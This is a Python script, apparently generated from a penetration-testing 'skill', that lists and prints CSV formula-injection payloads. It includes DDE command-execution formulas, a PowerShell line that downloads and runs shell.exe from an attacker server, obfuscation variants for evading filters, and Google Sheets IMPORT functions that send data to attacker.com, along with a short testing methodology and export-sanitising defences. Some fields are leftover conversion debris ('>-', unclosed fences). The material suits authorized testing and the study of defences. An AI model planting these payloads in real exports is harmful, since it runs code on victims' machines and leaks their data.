#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/csv-formula-injection

Skill: SKILL: CSV Formula Injection
Desc : >-

Run:  python hack-skills-csv-formula-injection.py --help
      python hack-skills-csv-formula-injection.py --list
      python hack-skills-csv-formula-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/csv-formula-injection'
TITLE = 'SKILL: CSV Formula Injection'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: csv-formula-injection", "description: >-", "CSV/spreadsheet formula injection (DDE, Excel/LibreOffice, Google Sheets IMPORT*). Use when exports, imports, or user fields feed spreadsheets or reporting tools."],
    'skill-csv-formula-injection': [],
    '0-quick-start': ["Characters that may trigger formula evaluation when a cell is opened in Excel, LibreOffice Calc, or similar (often only if the cell is interpreted as a formula):", "```text", "Test cells may look like:", "```csv", "name,value", "test,=1+1", "test,+1+1", "test,-1+1", "test,@SUM(1+1)", "**Routing note**: when testing CSV exports, back-office reports, or user data opened in spreadsheets, prioritize these prefix characters."],
    '1-dde-injection-excel-libreoffice': ["Dynamic Data Exchange (DDE) and external call patterns historically abused in spreadsheets. Examples for **controlled lab** reproduction:", "```text", "DDE(\"cmd\";\"/C calc\";\"!A0\")A0", "```text", "@SUM(1+1)*cmd|' /C calc'!A0", "```text", "=2+5+cmd|' /C calc'!A0", "```text", "=cmd|' /C calc'!'A1'", "PowerShell-style chaining (lab only; replace host and payload with benign equivalents):", "```text", "=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0"],
    '2-obfuscation': ["Defensive parsers may strip obvious patterns; testers may try noise and spacing (still only where allowed):", "```text", "AAAA+BBBB-CCCC&\"Hello\"/12345&cmd|'/c calc.exe'!A", "Extra whitespace after `=`:", "```text", "=         cmd|'/c calc.exe'!A", "Dispersed characters / unusual spacing (conceptual pattern\u2014adjust per parser):", "```text", "=    C    m D    |'/c calc.exe'!A", "`rundll32` style:", "```text", "=rundll32|'URL.dll,OpenURL calc.exe'!A"],
    '3-google-sheets': ["If exported data is later opened in **Google Sheets**, or sheets pull from untrusted CSV, these functions can cause **outbound requests** or **cross-document data pulls**:", "**Data exfiltration / probe (replace URL with your authorized callback):**", "```text", "=IMPORTXML(\"http://attacker.com/\", \"//a/@href\")", "Other high-risk imports:", "```text", "=IMPORTRANGE(\"spreadsheet_url\", \"range\")", "=IMPORTHTML(\"http://attacker.com/table\", \"table\", 1)", "=IMPORTFEED(\"http://attacker.com/feed.xml\")", "=IMPORTDATA(\"http://attacker.com/data.csv\")", "Document which function executed and what network side effects occurred."],
    '4-testing-methodology': ["1. **Map sinks** \u2014 Any feature that emits **CSV, XLSX, or tab-separated** output: admin exports, audit logs, user rosters, billing reports, search results.", "2. **Trace user-controlled fields** \u2014 Profile fields, ticket titles, transaction memos, tags, filenames in ZIP exports\u2014any column that echoes stored input.", "3. **Inject formula prefixes** \u2014 Start with benign arithmetic (`=1+1`, `+1+1`) to detect evaluation; escalate only per rules.", "4. **Open in target software** \u2014 Match victim workflow: Excel desktop, LibreOffice, Google Sheets import, locale-specific decimal separators.", "5. **Evidence** \u2014 Screenshot/capture whether the cell shows a calculated result, a security warning, or DDE prompt; note product version.", "**Note**: focus on the `user input -> export -> opened in spreadsheet software` chain."],
    '5-defense': ["Application and export-layer mitigations:", "- **Prefix with single quote** \u2014 In many spreadsheet apps, leading `'` forces **text** interpretation: `'=cmd|...` displays literally.", "- **Prefix with tab** \u2014 Some pipelines treat tab-prefixed fields as non-formula text when ingested correctly.", "- **Strip or neutralize leading triggers** \u2014 Remove or escape leading `=`, `+`, `-`, `@` (and Unicode lookalikes) at export time.", "- **CSV encoding** \u2014 Use consistent quoting; validate column types; avoid passing raw formula strings into financial/reporting templates without sanitization.", "- **User education** \u2014 Do not enable external data / DDE without policy.", "Example safe export transformation (conceptual):", "```text", "Input:  =1+1", "Output: '=1+1   OR   \\t=1+1   OR   (empty prefix) with escaped quotes per RFC 4180", "**Note**: when correlating business exports, reports, and API export parameters, combine with injection, business-logic, and API-security skills."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()